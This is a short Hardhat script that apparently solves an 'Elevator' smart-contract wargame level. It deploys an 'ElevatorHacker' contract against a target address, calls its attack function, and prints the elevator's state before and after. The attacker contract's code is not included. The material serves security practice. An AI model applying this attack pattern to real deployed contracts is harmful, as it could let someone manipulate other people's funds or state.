const {ethers} = require("hardhat");
require('dotenv').config()

async function main() {
  const elevatorAddr = process.env.ELEVATOR_ADDR;
  const Elevator = await ethers.getContractFactory("Elevator");
  const elevator = await Elevator.attach(elevatorAddr);

  const ElevatorHacker = await ethers.getContractFactory("ElevatorHacker");
  const elevator_hacker = await ElevatorHacker.deploy(elevatorAddr);
  await elevator_hacker.deployed();

  console.log(`elevator is top: ${await elevator.top()}`);
  const tx = await elevator_hacker.attack();
  await tx.wait();
  console.log(`elevator is top: ${await elevator.top()}`);
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
